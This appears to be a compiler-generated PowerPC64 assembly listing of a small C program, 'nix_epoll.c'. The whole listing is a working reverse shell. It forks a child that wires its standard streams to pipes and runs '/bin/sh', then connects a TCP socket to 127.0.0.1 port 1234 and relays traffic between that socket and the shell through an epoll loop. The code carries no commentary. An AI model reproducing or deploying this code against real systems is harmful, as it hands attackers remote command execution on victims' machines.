	.file	"nix_epoll.c"
	.abiversion 2
	.section	".toc","aw"
	.section	".text"
	.section	.text.startup,"ax",@progbits
	.align 2
	.globl main
	.type	main, @function
main:
0:	addis 2,12,.TOC.-0b@ha
	addi 2,2,.TOC.-0b@l
	.localentry	main,.-main
	mflr 0
	bl _savegpr0_25
	stdu 1,-8368(1)
	addi 3,1,8296
	bl pipe
	nop
	addi 3,1,8288
	bl pipe
	nop
	bl fork
	nop
	mr. 27,3
	lwz 3,8296(1)
	extsw 3,3
	bne 0,.L2
	li 4,0
	bl dup2
	nop
	lwa 3,8292(1)
	li 4,1
	bl dup2
	nop
	lwa 3,8292(1)
	li 4,2
	bl dup2
	nop
	lwa 3,8296(1)
	bl close
	nop
	lwa 3,8300(1)
	bl close
	nop
	lwa 3,8288(1)
	bl close
	nop
	lwa 3,8292(1)
	bl close
	nop
	addis 3,2,.LC0@toc@ha
	addi 4,1,8272
	std 27,8280(1)
	addi 3,3,.LC0@toc@l
	li 5,0
	std 3,8272(1)
	bl execve
	nop
	b .L3
.L2:
	bl close
	nop
	lwa 3,8292(1)
	bl close
	nop
	li 4,1
	li 5,0
	li 3,2
	bl socket
	nop
	li 9,2
	addi 4,1,8224
	li 5,16
	sth 9,8224(1)
	li 9,-11772
	mr 30,3
	sth 9,8226(1)
	lis 9,0x100
	ori 9,9,127
	std 9,8228(1)
	bl connect
	nop
	li 3,0
	bl epoll_create1
	nop
	cmpwi 7,3,0
	mr 29,3
	ble 7,.L4
	lwa 26,8288(1)
	mr 28,1
	li 25,1
	li 31,0
	stwu 25,8256(28)
	rldimi 31,30,0,32
	li 4,1
	rldimi 31,26,32,0
	extsw 5,31
	stw 5,8264(1)
	mr 6,28
	bl epoll_ctl
	nop
	sradi 5,31,32
	mr 3,29
	stw 25,8256(1)
	li 4,1
	mr 6,28
	stw 5,8264(1)
	bl epoll_ctl
	nop
.L8:
	mr 3,29
	addi 4,1,8240
	li 5,1
	li 6,-1
	bl epoll_wait
	nop
	cmpwi 7,3,0
	ble 7,.L5
	lwz 9,8240(1)
	rlwinm. 10,9,0,27,28
	bne 0,.L5
	rldicl. 10,9,0,63
	beq 0,.L5
	lwz 9,8248(1)
	cmpw 7,9,30
	bne 7,.L6
	li 5,8192
	mr 3,30
	addi 4,1,32
	bl read
	nop
	extsw 5,3
	lwa 3,8300(1)
	b .L13
.L6:
	lwa 3,8288(1)
	li 5,8192
	addi 4,1,32
	bl read
	nop
	extsw 5,3
	mr 3,30
.L13:
	addi 4,1,32
	bl write
	nop
	b .L8
.L5:
	li 4,2
	mr 5,30
	li 6,0
	mr 3,29
	bl epoll_ctl
	nop
	mr 3,29
	li 4,2
	mr 5,26
	li 6,0
	bl epoll_ctl
	nop
	mr 3,29
	bl close
	nop
.L4:
	mr 3,27
	li 4,17
	bl kill
	nop
	mr 3,30
	bl close
	nop
.L3:
	lwa 3,8300(1)
	bl close
	nop
	lwa 3,8288(1)
	bl close
	nop
	addi 1,1,8368
	li 3,0
	b _restgpr0_25
	.long 0
	.byte 0,0,0,1,128,7,0,0
	.size	main,.-main
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"/bin/sh"
	.ident	"GCC: (Debian 4.9.2-10) 4.9.2"
	.section	.note.GNU-stack,"",@progbits
